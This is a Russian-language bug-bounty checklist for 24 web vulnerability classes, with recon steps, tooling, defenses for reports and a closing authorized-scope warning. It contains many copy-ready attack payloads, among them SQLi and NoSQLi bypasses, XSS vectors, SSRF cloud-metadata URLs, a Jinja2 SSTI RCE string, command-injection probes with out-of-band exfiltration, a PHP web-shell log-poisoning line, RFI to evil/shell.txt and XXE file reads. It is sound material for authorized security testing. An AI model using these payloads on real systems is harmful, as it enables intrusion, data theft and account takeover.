# Чек-листы по уязвимостям (operational, 2025-2026)

> Формат: каждый пункт — действие. Идёшь сверху вниз, отмечаешь `[x]`. Вставляй нужный блок в начало раздела уязвимости.
> Payload'ы технические — копируй как есть. Развёрнутое исследование (impact, CVE, источники) — в отдельном документе-справочнике.

**Содержание:** [SQLi](#1-sql-injection) · [XSS](#2-xss) · [SSRF](#3-ssrf) · [SSTI](#4-ssti) · [IDOR/BOLA](#5-idor--bola) · [CSRF](#6-csrf) · [Command Injection](#7-command-injection) · [LFI/RFI + Traversal](#8-lfirfi--directory-traversal) · [XXE](#9-xxe) · [Deserialization](#10-insecure-deserialization) · [JWT](#11-jwt) · [OAuth](#12-oauth-misconfiguration) · [ATO](#13-account-takeover) · [Business Logic](#14-business-logic) · [Race Condition](#15-race-condition) · [CORS](#16-cors) · [Open Redirect](#17-open-redirect) · [Request Smuggling](#18-request-smuggling-http-desync) · [GraphQL](#19-graphql) · [NoSQLi](#20-nosql-injection) · [Prototype Pollution](#21-prototype-pollution) · [Mass Assignment](#22-mass-assignment) · [Web Cache Deception](#23-web-cache-deception--poisoning) · [Recon/Methodology](#24-recon--methodology-старт-на-новой-цели)

---

## 1. SQL Injection

**Recon / где искать**
- [ ] Выписать все входные точки: GET, POST, cookie, headers (`User-Agent`, `Referer`, `X-Forwarded-For`), JSON-поля
- [ ] Отметить параметры, похожие на запрос к БД: `id`, `search`, `filter`, `sort`, `order`, `category`

**Детект**
- [ ] На каждый параметр: `'` → смотреть на 500/ошибку/изменение ответа
- [ ] Парная проба: `'` ломает, `''` чинит → сильный признак SQLi
- [ ] Boolean: `1' AND '1'='1` vs `1' AND '1'='2` → разница в ответе
- [ ] Time-based (Postgres): `'||pg_sleep(5)--`
- [ ] Time-based (MySQL): `' AND SLEEP(5)-- -`
- [ ] Time-based (MSSQL): `'; WAITFOR DELAY '0:0:5'--`

**Эксплуатация**
- [ ] UNION: определить число колонок через `' ORDER BY 1-- -`, `2`, `3`... до ошибки
- [ ] UNION: найти отражаемые колонки `' UNION SELECT 1,2,3-- -`
- [ ] Вытащить версию/имя БД в отражаемую колонку (`@@version`, `version()`)
- [ ] Если вывода нет → boolean-blind или time-blind посимвольно
- [ ] Error-based если ошибки видны в ответе

**Обход WAF / фильтров**
- [ ] JSON-синтаксис (обход большинства WAF): оператор `'@>`/`<@`/`?` (JSON-операторы PostgreSQL) / экранирование через JSON
- [ ] Inline-комментарии: `SEL/**/ECT`, `UN/**/ION`
- [ ] Смена регистра: `SeLeCt`
- [ ] Unicode / double-encoding
- [ ] Инъекция в cookie или второй параметр (`sqlmap --param-filter=cookie`)
- [ ] `sqlmap` tamper: `randomcase.py`, `space2comment.py`, `charunicodeencode.py`

**Инструменты:** `sqlmap` (+ tamper), `ghauri`, Burp Intruder
**Защита (для репорта):** prepared statements / параметризованные запросы везде; least-privilege БД-аккаунт; WAF — вторичный слой

---

## 2. XSS

**Recon / где искать**
- [ ] Найти все reflection-точки (ввод → отражается в HTML-ответе)
- [ ] Найти stored-точки (имя, комментарий, профиль, имя файла)
- [ ] DOM: грепнуть JS на источники `location.hash`, `location.search`, `postMessage`, `document.referrer`
- [ ] DOM: найти стоки `innerHTML`, `outerHTML`, `eval`, `document.write`, `setAttribute('href'/'src')`

**Детект**
- [ ] Вставить маркер `xss1234` → найти в ответе → понять контекст (HTML / атрибут / JS / URL)
- [ ] Проверить, какие символы проходят без экранирования: `<` `>` `"` `'` `` ` `` `/`

**Эксплуатация (по контексту)**
- [ ] HTML-контекст: `<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`
- [ ] HTML-контекст (новые теги): `<details ontoggle=alert(1) open>`, `<video onloadstart=alert(1) src=x>`
- [ ] Атрибут: выйти из него `"><svg onload=alert(1)>`
- [ ] JS-строка: `';alert(1)//`
- [ ] DOM: подать payload в источник (`#<img src=x onerror=alert(1)>`) и проверить сток в DevTools

**Обход фильтров / CSP**
- [ ] mXSS против санитайзера (DOMPurify): `<math><mtext><table><mglyph><style><!--</style><img title="-->...">`
- [ ] DOM clobbering: `<a id=x><a id=x name=...>` для перезаписи переменных
- [ ] CSP-обход через `strict-dynamic` + clobbering (`script.src`)
- [ ] Инъекция через заголовки (`X-Forwarded-For`, `User-Agent`) в stored-точку
- [ ] Фрагментация/кодирование payload

**Инструменты:** Burp DOM Invader, `dalfox`, Hackvertor, `semgrep`/CodeQL (source→sink)
**Защита (для репорта):** контекстное экранирование; CSP с nonce/hash; Sanitizer API (присваивает DOM, не строку); Trusted Types

---

## 3. SSRF

**Recon / где искать**
- [ ] Найти url-параметры: `url`, `uri`, `proxy`, `webhook`, `callback`, `import`, `fetch`, `feed`, `dest`, `link`
- [ ] Найти функции, дёргающие внешние ресурсы: импорт по URL, превью ссылок, рендер PDF/изображений, webhooks, SSO-discovery

**Детект**
- [ ] Подставить свой Collaborator/`interactsh`-домен → ждать DNS/HTTP callback (blind)
- [ ] Подставить `http://127.0.0.1:80/` и внутренние порты → смотреть разницу ответов/таймингов

**Эксплуатация — cloud metadata**
- [ ] AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- [ ] AWS (IMDSv2 нужен токен): `PUT /latest/api/token` + заголовок `X-aws-ec2-metadata-token-ttl-seconds`
- [ ] GCP: `http://metadata.google.internal/computeMetadata/v1/` + заголовок `Metadata-Flavor: Google`
- [ ] Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + `Metadata: true`
- [ ] EKS Pod Identity: `http://169.254.170.23/...` (env `AWS_CONTAINER_CREDENTIALS_FULL_URI`)

**Обход фильтров**
- [ ] Decimal/hex IP: `http://2130706433/`, `http://0x7f000001/`, `http://0177.0.0.1`
- [ ] Userinfo-трюк: `http://localhost@attacker.com`, `http://attacker.com#localhost`
- [ ] IPv6 / short-form: `http://[::1]/`, `http://[::ffff:169.254.169.254]/`, `http://0/`, `http://0.0.0.0/`; follow-redirect с разрешённого хоста на `169.254.169.254`
- [ ] Альтернативные схемы: `gopher://` (Redis/SMTP), `dict://`, `file://`
- [ ] DNS rebinding (TOCTOU) — если валидация и запрос разнесены (Singularity)
- [ ] Если IMDSv2 включён → искать сервис, рендерящий HTML/XML (iframe `<iframe src="http://169.254.169.254/...">` в pandoc-подобных конвертерах)

**Инструменты:** Burp Collaborator, `interactsh`, `SSRFmap`, `gopherus`, Singularity
**Защита (для репорта):** IMDSv2 `HttpTokens=required` + hop limit; allowlist доменов; egress-фильтр к RFC1918/link-local; резолв DNS и запрос — одним шагом

---

## 4. SSTI

**Recon / где искать**
- [ ] Найти точки, где ввод попадает в шаблон: письма, кастомные сообщения, имена, экспорт, генерация документов

**Детект**
- [ ] Polyglot (вызовет ошибку при уязвимости): `${{<%[%'"}}%\`
- [ ] Математика: `{{7*7}}` → `49`; `${7*7}`; `<%= 7*7 %>`; `#{7*7}`
- [ ] По реакции определить движок через Hackmanit Template Injection Table

**Эксплуатация (по движку)**
- [ ] Jinja2: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`
- [ ] Jinja2 (через request): `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|...}}`
- [ ] Java/SpEL, Freemarker, Velocity, Smarty, Twig → см. `Server Side Template Injection/` в PaTT

**Обход фильтров**
- [ ] Доступ через `[]` вместо `.`
- [ ] Hex-литералы `\x5f` вместо `_`
- [ ] Сборка строк из ASCII: `chr()` (Jinja2), `((char)105)` (Java)
- [ ] Комментарии `/**/`; альтернативные блок-теги `{% %}`
- [ ] RCE без кавычек/плагинов через нативные функции движка (Jinja2 `chr`, Smarty-модификаторы, Blade `array_map`+`implode`+`chr`)

**Инструменты:** `SSTImap`, `tinja`, `tplmap`, Hackmanit Template Injection Table
**Защита (для репорта):** не конкатенировать ввод в шаблон (передавать как данные); sandbox (помнить про обходимость)

---

## 5. IDOR / BOLA

**Recon / где искать**
- [ ] Завести 2 аккаунта: A (атакующий) и B (жертва)
- [ ] Собрать все object ID в запросах: числовые, UUID, hash, base64

**Детект**
- [ ] В запросах аккаунта A подменить ID на ID объекта аккаунта B → получить доступ?
- [ ] Проверить ВСЕ методы на объекте: `GET`, `PUT`, `PATCH`, `DELETE`
- [ ] Проверить без авторизации (удалить cookie/токен) → доступ остаётся?

**Эксплуатация / тонкости**
- [ ] Не только `id±1`: UUID брать из публичных эндпоинтов и shared-ссылок
- [ ] Декодировать «непрямые» ID: base64 (`MTIzNDU2`→`123456`), hash → искать последовательные int
- [ ] Function-level: обычным юзером дёрнуть `/admin/...`, `/api/internal/...`
- [ ] Chain: IDOR + Mass Assignment → выставить `password`/`email` на чужой объект → ATO
- [ ] Array/object-wrap и HPP: `id[]=victim`, `{"id":[victim]}`, дубль `id=self&id=victim` — бэкенд авторизует одно значение, действует на другое

**Инструменты:** Burp **Autorize** (реплей с cookie low-priv), Repeater, Logger, `ffuf` (shadow-эндпоинты, Swagger)
**Защита (для репорта):** серверная проверка владения объектом; indirect object references; user-context validation
> ⚠️ Без второго аккаунта IDOR не доказать. 403 бывает клиентским — повторяй запрос без лишних заголовков.

---

## 6. CSRF

**Recon / где искать**
- [ ] Найти state-changing запросы (смена email/пароля, перевод, настройки)
- [ ] Проверить наличие anti-CSRF токена и **его валидацию** (удалить/подменить токен)
- [ ] Посмотреть атрибут `SameSite` на session-cookie (есть ли явный, или Chrome default)

**Детект / обходы**
- [ ] Токен не валидируется или принимается чужой/пустой → CSRF есть
- [ ] Сервер не различает GET/POST → top-level GET: `<script>location='https://site/account/transfer?to=hacker&amount=1000000'</script>`
- [ ] Cookie **без явного** `SameSite` → окно Lax+POST 120 c: успеть отправить top-level POST в первые 2 минуты после выдачи cookie
- [ ] Принудительно обновить session-cookie жертвы перед атакой (OAuth/SSO-флоу) → попасть в окно
- [ ] XSS/инъекция на sibling-субдомене → обход site-based SameSite (keyed на eTLD+1)
- [ ] `SameSite=Strict` → искать **client-side** redirect-гаджет (браузер считает это same-site; server-side redirect НЕ подходит)
- [ ] Method override (Symfony): `GET /change-email?email=...&_method=POST` (на проводе GET, фреймворк роутит POST)

**Эксплуатация**
- [ ] Построить PoC формой (Burp → «Generate CSRF PoC») и проверить на своём аккаунте

**Инструменты:** Burp «Generate CSRF PoC»
**Защита (для репорта):** synchronizer token / double-submit + `SameSite=Strict`; помнить, что SameSite ≠ защита от same-site-cross-origin

---

## 7. Command Injection

**Recon / где искать**
- [ ] Найти функции, дёргающие shell: `ping`/`nslookup`/`traceroute`, конвертеры, архивация, экспорт, обработка имён файлов

**Детект**
- [ ] In-band: `;id`, `|id`, `` `id` ``, `$(id)`, `&&id`, `||id`
- [ ] Blind time: `;sleep 10`, `& ping -n 11 127.0.0.1`
- [ ] Blind OOB: `;nslookup $(whoami).<collab>`, `;curl http://<collab>/`

**Эксплуатация**
- [ ] Подтвердить выполнение (вывод `id`/задержка/DNS-callback)
- [ ] Argument injection (CWE-88): если прямой инъекции нет — попробовать подсунуть доп. флаг в аргумент

**Обход фильтров**
- [ ] Пробел → `$IFS` или `${IFS}`
- [ ] Глоб: `/???/??t /???/p??s??` (= `/bin/cat /etc/passwd`)
- [ ] Кавычки/конкатенация: `w'h'oami`, `who$@ami`
- [ ] CRLF `\r\n` (если escaping не учитывает перевод строки)
- [ ] Различия `dash` vs `bash`; кодирование payload

**Инструменты:** Burp Collaborator/`interactsh` (OAST), `commix`
**Защита (для репорта):** не использовать shell (API с массивом аргументов); allowlist; escaping — крайняя мера

---

## 8. LFI/RFI + Directory Traversal

**Recon / где искать**
- [ ] Найти параметры пути/файла: `file`, `page`, `path`, `template`, `include`, `doc`, `lang`

**Детект**
- [ ] Traversal: `../../../../etc/passwd`, `..%2f..%2f`, `....//....//`
- [ ] Null-byte (PHP < 5.3.4): `...%00.png`
- [ ] Чтение исходников: `php://filter/convert.base64-encode/resource=index`

**Эксплуатация — LFI → RCE**
- [ ] PHP filter chains (без `allow_url_include`) — генератор `php_filter_chain_generator`
- [ ] cnext-exploits (glibc `iconv` overflow) — RCE без writable-путей
- [ ] Log poisoning: `User-Agent: <?php system($_GET['c']);?>` + include `/var/log/nginx/access.log`
- [ ] `php://input` + POST-тело с PHP
- [ ] `data://text/plain;base64,...`
- [ ] `/proc/self/environ`, `expect://`, `phar://` (deserialization)
- [ ] RFI: `?page=http://evil/shell.txt` (при `allow_url_include=On`) или SMB-путь на Windows

**Обход WAF**
- [ ] PHP-wrapper вместо `../`
- [ ] **Ghost Bits** (Java-стек): `.`→`阮`(U+962E), `/`→`阯`(U+962F)
- [ ] Over-long UTF-8, fullwidth solidus `／`, RTL-override, NFKC-нормализация

**Инструменты:** `php_filter_chain_generator` (Synacktiv), Lightyear, `cnext-exploits`, `LFImap`, `fimap`
**Защита (для репорта):** не передавать ввод в `include`/`require`/`fopen`; mapping ID→фиксированный путь

---

## 9. XXE

**Recon / где искать**
- [ ] Найти XML-точки: явный XML-body, SOAP, SAML, загрузка SVG/DOCX/XLSX
- [ ] Проверить эндпоинты, толерантные к смене на `Content-Type: application/xml` (JSON→XML pivot)

**Детект / эксплуатация**
- [ ] Классический: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` + `&xxe;` в отражаемом поле
- [ ] Blind OOB: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<collab>">%xxe;]>`
- [ ] Внешний DTD для эксфильтрации файла
- [ ] Error-based (если OOB закрыт): переопределение внешней сущности через локальный DTD
- [ ] Blind XXE → использовать как SSRF для внутренней разведки

**Векторы загрузки**
- [ ] SVG: `<image xlink:href="file:///etc/passwd">` (работает даже при отключённых general entities)
- [ ] DOCX/XLSX: распаковать → добавить DOCTYPE в `word/document.xml` → запаковать
- [ ] SAML: DOCTYPE до подписанных элементов (подпись покрывает не весь документ)

**Инструменты:** Burp Collaborator/`interactsh`, `XXEinjector`
**Защита (для репорта):** `disallow-doctype-decl=true`; `external-general-entities=false`; `external-parameter-entities=false`

---

## 10. Insecure Deserialization

**Recon / где искать**
- [ ] Найти сериализованные данные по сигнатурам: Java `rO0`/`0xACED`, .NET `AAEAAAD` / hex `00 01 00 00 00 FF FF FF FF`, PHP `O:`/`a:`
- [ ] Проверить cookies, `viewstate`, токены, кэш, очереди

**Детект**
- [ ] Java: проба `URLDNS` (DNS-lookup, работает на любой версии Java) → ждать callback
- [ ] Определить библиотеки в classpath (по поведению/ошибкам) для подбора gadget chain

**Эксплуатация**
- [ ] Java: `ysoserial` → подобрать цепочку (`CommonsCollections6`, `C3P0`, `CommonsBeanutils1`)
- [ ] Java 16+: `ysoserial` с `--add-opens=...` или использовать **GadgetBuilder** (303 комбинации, 17 цепочек снова рабочие)
- [ ] .NET: `ysoserial.net`
- [ ] PHP: `phpggc` (+ phar:// при FS-вызовах)

**Инструменты:** `ysoserial`, **GadgetBuilder**, `ysoserial.net`, `phpggc`, `gadgetinspector`
**Защита (для репорта):** не десериализовать недоверенное; allowlist классов (`ObjectInputFilter`); обновлять библиотеки

---

## 11. JWT

**Recon / где искать**
- [ ] Найти JWT (header.payload.signature, начинается с `eyJ`)
- [ ] Decode header и payload (Burp JWT Editor)

**Детект / эксплуатация**
- [ ] `alg:none` + пустая подпись; перебрать регистр: `none`, `None`, `NONE`, `nOnE`
- [ ] Algorithm confusion RS256→HS256: подписать HS256, использовав **публичный ключ** как HMAC-secret
- [ ] Достать публичный ключ: `/.well-known/jwks.json`, `/jwks.json`
- [ ] `kid` injection: path traversal (`../../dev/null`), SQLi
- [ ] `jku`/`x5u` → подставить URL на свой сервер с подконтрольным ключом
- [ ] Brute weak HMAC secret (`hashcat -m 16500`)
- [ ] Cross-service reuse: проверить `aud` — токен от одного сервиса принимается другим?
- [ ] Проверить `exp` (принимается ли просроченный)

**Обход фильтров**
- [ ] fast-jwt-подобные баги: leading whitespace в публичном ключе ломает regex-проверку (CVE-2026-34950) → algorithm confusion заново

**Инструменты:** Burp **JWT Editor**, `jwt_tool`, `hashcat`
**Защита (для репорта):** явно указывать алгоритм при verify; allowlist header-полей (reject `jku`/`x5u`/`jwk`/`crit`); раздельные ключи

---

## 12. OAuth Misconfiguration

**Recon / где искать**
- [ ] Определить тип flow (authorization code / implicit / PKCE)
- [ ] Выписать параметры: `redirect_uri`, `state`, `code`, `client_id`, `scope`

**Детект / эксплуатация**
- [ ] `redirect_uri` манипуляция: `https://default-host.com&@foo.evil#@bar.evil/`, `localhost.evil.com`, duplicate-параметры
- [ ] `state` отсутствует/не проверяется → CSRF на привязку аккаунта
- [ ] Pre-account takeover: зарегистрировать аккаунт на email жертвы до её первого OAuth-входа → слияние без проверки владения
- [ ] Identity injection: вход по mutable `email` (а не immutable `sub`/Object ID)
- [ ] Authorization-code swap: украденный code из любого приложения → first-party токен (если не проверяется client/redirect/nonce)
- [ ] Reflected XSS в `error_description`/`redirectUrl` на trusted callback
- [ ] PKCE downgrade/removal: убрать `code_challenge` или сменить `S256`→`plain` (или подсунуть свой verifier) → перехваченный code снова годен для обмена
- [ ] Повторное использование authorization code: сервер не инвалидирует code после первого обмена → реплей украденного code на второй токен
- [ ] Утечка code/токена через Referer: callback с `code`/`token` в URL утекает на сторонние ресурсы (img/script/link) через заголовок Referer
- [ ] Scope escalation: подменить/расширить `scope` в запросе авторизации или при обмене → токен с правами больше, чем положено клиенту
- [ ] IdP mix-up: в мульти-IdP начать flow с IdP-атакующего, подсунуть callback честного IdP → `code` уходит не на тот token-endpoint (если нет `iss`/привязки к IdP)

**Инструменты:** Burp, Doyensec OAuth Security Cheat Sheet
**Защита (для репорта):** строгая проверка `redirect_uri`; PKCE (S256, обязательный); верификация email; привязка code к client/redirect/nonce; одноразовый code; проверка `iss`

---

## 13. Account Takeover

> ATO почти всегда — цепочка. Прогнать каждый вектор:

- [ ] Password reset: токен утекает в Referer / в ответе / предсказуем
- [ ] Password reset: `Host`-header poisoning → ссылка с reset-токеном уходит на твой домен
- [ ] Смена email без re-auth (+ chain с IDOR/Mass Assignment на чужой профиль)
- [ ] OAuth pre-account takeover
- [ ] JWT forge
- [ ] 2FA bypass: response manipulation (`{"success":false}`→`true`), пропуск шага, brute OTP (+ race)
- [ ] Session не инвалидируется после смены пароля
- [ ] Коллизия username/email: пробелы до/после (`"admin "`), Unicode-нормализация (NFKC) и IDN-гомоглифы (кириллическая `а`, `demⓞ@x.com`) схлопывают твою учётку в чужую при сбросе/слиянии

**Инструменты:** Burp, Autorize
**Защита (для репорта):** инвалидация всех сессий при смене пароля/email; re-auth на чувствительных действиях; безопасные reset-токены
> Для репорта — полный PoC с реальным захватом чужого аккаунта, не теория.

---

## 14. Business Logic

**Recon / где искать**
- [ ] Полностью разобрать целевой workflow (checkout, перевод, оформление, апгрейд)
- [ ] Выписать инварианты, которые «должны» соблюдаться (цена ≥ 0, шаги по порядку, лимиты)

**Детект / эксплуатация**
- [ ] Нарушить порядок шагов: пропустить / повторить / выполнить из другого состояния
- [ ] Граничные значения: отрицательное количество, `0`, дробное, гигантское, переполнение
- [ ] Манипуляция ценой/валютой/скидкой в запросе
- [ ] Купоны/рефералы: повторное применение, накрутка
- [ ] Состояние корзины/заказа: подмена после расчёта цены
- [ ] Replay одной операции (+ race)

**Инструменты:** ручной анализ + Burp Repeater; Turbo Intruder для граней
**Защита (для репорта):** серверная валидация инвариантов и переходов состояний; идемпотентность

---

## 15. Race Condition

**Recon / где искать**
- [ ] Найти операцию над общим состоянием: промокод, баланс, вывод средств, попытки OTP, лимит регистраций/инвайтов, лайк/голос

**Детект / эксплуатация**
- [ ] Продублировать запрос 20-30 раз
- [ ] HTTP/2: отправить группой параллельно (Burp Repeater → «Send group in parallel» = single-packet attack)
- [ ] HTTP/1: Turbo Intruder с last-byte sync
- [ ] Проверить аномалию: двойное списание/начисление, обход лимита, два эффекта одного токена
- [ ] Большой payload / обход лимита числовой OTP → first-sequence-sync (Flatt) против лимита 65 535 байт

**Инструменты:** Burp Repeater (tab groups), **Turbo Intruder** (`race-single-packet-attack.py`)
**Защита (для репорта):** атомарные операции/транзакции; `SELECT ... FOR UPDATE`; идемпотентные ключи; unique constraints

---

## 16. CORS

**Recon / где искать**
- [ ] Найти эндпоинты с чувствительными данными, возвращающие CORS-заголовки

**Детект / эксплуатация**
- [ ] Отправить `Origin: https://attacker.com` → отражается в `Access-Control-Allow-Origin`?
- [ ] Проверить `Access-Control-Allow-Credentials: true` рядом с отражённым origin → critical
- [ ] `Origin: null` → принимается? (эксплойт через sandboxed iframe `srcdoc`)
- [ ] Regex-обход: `example.com.attacker.com`, `examplexcom` (неэкранированная точка), `hackersnormal-website.com` (suffix)
- [ ] Trusted-субдомен с XSS / subdomain takeover
- [ ] Построить PoC: `fetch(url,{credentials:'include'})` со своего origin → читаем ответ

**Инструменты:** `CORScanner`, `nuclei`, Burp
**Защита (для репорта):** строгий allowlist origin; не reflect; не вайтлистить `null`; не сочетать `*` с credentials
> CORS ≠ защита от CSRF.

---

## 17. Open Redirect

**Recon / где искать**
- [ ] Найти redirect-параметры: `url`, `next`, `return`, `returnUrl`, `redirect`, `dest`, `continue`, `goto`
- [ ] Проверить DOM-источники (`location`, `location.hash`) → сток `location.href`

**Детект / эксплуатация**
- [ ] `//evil.com`, `https://evil.com`, `https:evil.com`, `/\evil.com`
- [ ] `/%2f%2fevil.com`, `https:/evil.com`, double-encoding
- [ ] `http://trusted.com.evil.com`, `http://trusted.com@evil.com`
- [ ] Whitelisted-домен в пути/фрагменте

**Chain (главная ценность)**
- [ ] Client-side open redirect → обход `SameSite=Strict` CSRF
- [ ] Кража OAuth `code`/токена через `redirect_uri`
- [ ] Усиление SSRF: редирект с разрешённого хоста на `169.254.169.254`

**Инструменты:** `OpenRedireX`, `gf` patterns, Burp Intruder
**Защита (для репорта):** allowlist целей; относительные пути; mapping ID→URL

---

## 18. Request Smuggling (HTTP Desync)

**Recon / setup**
- [ ] Установить **HTTP Request Smuggler v3.0** (Burp BApp)
- [ ] Определить цепочку (CDN/прокси): если фронт — nginx/Akamai/CloudFront/Fastly (нет upstream HTTP/2) → приоритет выше

**Детект**
- [ ] ПКМ на запросе → «Launch smuggle probe»
- [ ] Прогнать классы: CL.TE, TE.CL, TE.0, CL.0, **0.CL**, H2-downgrade
- [ ] Confirm через timeout / «Mystery 400» (вероятно эксплуатабельно)
- [ ] V-H / H-V parser-discrepancy по Host (детекция в v3.0)

**Эксплуатация**
- [ ] Request prefix (захват чужого запроса)
- [ ] Response-queue poisoning
- [ ] Header injection в чужой запрос
- [ ] Cache poisoning через smuggled-запрос
- [ ] 0.CL: разбить deadlock через early-response gadget (IIS `/con`, `/nul`)
- [ ] Expect-based: `Expect: 100-continue` (vanilla) и `Expect: y 100-continue` (obfuscated)
- [ ] Double-desync: 0.CL → CL.0 для отравления запроса жертвы

**Инструменты:** HTTP Request Smuggler v3.0, HTTP Hacker, Turbo Intruder (`0cl-find-offset.py`)
**Защита (для репорта):** end-to-end HTTP/2 (включая upstream фронт↔origin); единое ПО/конфиг; отключить reuse upstream-соединений; reject GET/HEAD с телом

---

## 19. GraphQL

**Recon / где искать**
- [ ] Найти эндпоинт: `/graphql`, `/graphiql`, `/api/graphql`, `/v1/graphql`
- [ ] Introspection: `{__schema{types{name fields{name}}}}` → выгрузить схему
- [ ] Визуализировать схему (GraphQL Voyager), найти admin/internal/legacy типы и mutations

**Детект / эксплуатация**
- [ ] Batching (массив операций) → обход rate-limit / brute force
- [ ] Aliases (даже при отключённом batching): `a1: login(...) a2: login(...)` в одном запросе
- [ ] BOLA/IDOR в мутациях (field-level authz часто неполна)
- [ ] DoS: глубокая рекурсия циклических типов; N alias-копий дорогого резолвера; `first:99999999`
- [ ] Field suggestions включены → enumeration схемы даже без introspection
- [ ] GraphQL CSRF: мутация через `Content-Type: text/plain` / `x-www-form-urlencoded` или query-over-GET (обходит JSON-preflight, CSRF-токен не требуется)

**Инструменты:** **InQL**, `GraphQLmap`, GraphQL Voyager, GraphQL Raider
**Защита (для репорта):** отключить introspection в проде (unauth); query depth/complexity limit; rate-limit по числу операций; persisted queries; per-resolver authz

---

## 20. NoSQL Injection

**Recon / где искать**
- [ ] Найти параметры аутентификации и поиска (MongoDB-бэкенд)

**Детект / эксплуатация**
- [ ] Operator injection (urlencoded): `username[$ne]=x&password[$ne]=x`
- [ ] Operator injection (JSON): `{"username":{"$ne":""},"password":{"$ne":""}}`
- [ ] Auth bypass варианты: `login[$gt]=admin&login[$lt]=test&pass[$ne]=1`, `login[$nin][]=admin&pass[$ne]=toto`
- [ ] Data extraction (посимвольно): `login[$regex]=^a.*`
- [ ] `$where` (server-side JS): инъекция JS-условия
- [ ] PHP-массивы: `parameter[arrName]=foo`

**Инструменты:** `NoSQLMap`, `nosqli`, Burp-NoSQLiScanner
**Защита (для репорта):** cast ввода в строку; оборачивать в `$eq`; typed structs (не generic maps); отключить `$where`/server-side JS

---

## 21. Prototype Pollution

**Recon / где искать**
- [ ] Найти source: JSON-body, query-string, `location.hash`, merge/clone/extend пользовательских объектов

**Детект / эксплуатация (client)**
- [ ] Внедрить: `?__proto__[test]=polluted` → проверить `Object.prototype.test` в консоли
- [ ] DOM Invader: режим поиска источников + «Break on property access» для гаджетов
- [ ] Найти gadget → DOM XSS (например `script.src` / `setTimeout`-сток)

**Детект / эксплуатация (server, Node)**
- [ ] `{"__proto__":{"isAdmin":true}}` → privilege escalation
- [ ] `constructor.prototype.X` если `__proto__` фильтруется
- [ ] Gadget chain → RCE (GHunter/Dasty)

**Инструменты:** Burp **DOM Invader**, `ppfuzz 2.0`, `protoStalker`, GHunter/Dasty
**Защита (для репорта):** `Object.create(null)` для пользовательских данных; `Object.freeze(Object.prototype)`; блокировать ключи `__proto__`/`constructor`/`prototype`; `Map` вместо объектов

---

## 22. Mass Assignment

**Recon / где искать**
- [ ] Перехватить запросы update/register/profile (PUT/PATCH/POST)
- [ ] Источник имён скрытых полей: Swagger/OpenAPI, GraphQL introspection, ответы API

**Детект / эксплуатация**
- [ ] Сначала добавить фейковое поле → ответ не изменился → вероятно есть фильтр
- [ ] Добавить чувствительные: `"is_admin":true`, `"role":"admin"`, `"balance":999999`, `"is_premium":true`, `"verified":true`
- [ ] Вариации регистра: `IsAdmin`, `ROLE`, `isAdmin:"true"`
- [ ] Вложенность: `"role":{"name":"admin"}`, `"permissions":{"admin":true}`
- [ ] Числовое/массив: `"role":1`, `"access_level":9999`, `"roles":["user","admin"]`
- [ ] Bool как строка/число: `"is_admin":1`
- [ ] Chain с IDOR → выставить `password`/`email` на чужом объекте → ATO

**Инструменты:** Burp Repeater/Intruder, `Param Miner`, `ffuf` (shadow-эндпоинты)
**Защита (для репорта):** allowlist редактируемых полей (DTO/binding allowlist); отделить input-модель от БД-модели

---

## 23. Web Cache Deception / Poisoning

**Recon / где искать**
- [ ] Найти приватный аутентифицированный эндпоинт (`/my-account`, `/api/me`)
- [ ] Понять связку CDN↔origin (Cloudflare+Nginx, CloudFront+Apache, Azure)

**Детект / эксплуатация (deception)**
- [ ] Добавить статичное расширение/делимитер: `/my-account/x.js`, `/my-account;.css`, `/my-account$.js`
- [ ] Смотреть `X-Cache: miss`→`hit`, заголовки `Cache-Control`/`Age`
- [ ] Открыть тот же URL из другой сессии → виден приватный ответ жертвы = подтверждено

**Детект / эксплуатация (poisoning)**
- [ ] `Param Miner` → найти unkeyed-входы (заголовки), отравляющие кэш
- [ ] Закэшировать вредоносный ответ под общим ключом

**Инструменты:** **CacheKiller** (PortSwigger), `Param Miner`
**Защита (для репорта):** не кэшировать динамику; согласованный URL-парсинг CDN↔origin; `Cache-Control: no-store` для приватного

---

## 24. Recon / Methodology (старт на новой цели)

> Не уязвимость, а порядок захода. Приоритет по ROI.

**Recon**
- [ ] Субдомены: `subfinder`, `amass`
- [ ] URL/история: `gau`, `katana`, `waybackurls`
- [ ] JS-эндпоинты: `LinkFinder`, ручной grep `fetch(`/`axios`/`/api/`
- [ ] Порты: `naabu`/`nmap`
- [ ] Fingerprint: Wappalyzer, favicon-hash, заголовки, формат токенов/cookies
- [ ] Скрытые параметры: `Param Miner`, `Arjun`
- [ ] Скрытые пути/эндпоинты: `ffuf`, `feroxbuster`
- [ ] Найти Swagger/OpenAPI/GraphQL-схему

**Порядок тестирования (сверху = выше ROI)**
- [ ] 1. API-логика: BOLA/IDOR + Mass Assignment + Excessive Data Exposure (2 аккаунта + Autorize)
- [ ] 2. Account Takeover-цепочки (OAuth pre-ATO, reset-flow, JWT)
- [ ] 3. SSRF при любом url-параметре → cloud metadata + DNS rebinding
- [ ] 4. Injection (SQLi/NoSQLi/Command/SSTI/XXE) с OAST для blind
- [ ] 5. Desync / Race / Cache на чувствительных операциях

**Инструментальный минимум**
- [ ] Burp Suite Pro: DOM Invader, Turbo Intruder, HTTP Request Smuggler v3.0, JWT Editor, Param Miner, Autorize
- [ ] `nuclei`, `ffuf`, `sqlmap`, `interactsh`/Collaborator

**Пороги, меняющие тактику**
- [ ] Виден WAF → JSON-based SQLi, Ghost Bits для traversal, tamper-скрипты, поиск origin-IP мимо CDN
- [ ] Есть `/graphql` → introspection + batching до REST
- [ ] CDN без upstream HTTP/2 (nginx/Akamai/CloudFront/Fastly) → приоритет desync
- [ ] Cookie без явного `SameSite` → окно Lax+POST 120 c; `SameSite=Strict` → client-side redirect-гаджет

**При репортинге**
- [ ] Полный воспроизводимый PoC (2 аккаунта для IDOR; рабочий desync-prefix; реальный захват данных)
- [ ] Внятный impact-блок
- [ ] Проверка на дубликаты в раскрытых отчётах
- [ ] Простой баг (одиночный IDOR/XSS) — слать быстро; сложную цепочку — добивать до максимального impact

---

> ⚠️ **Scope.** PHP filter chains RCE, cnext, ysoserial/GadgetBuilder, single-packet race — разрушительны/нагрузочны. Только в рамках авторизованного scope; многие программы запрещают DoS и mass account creation.
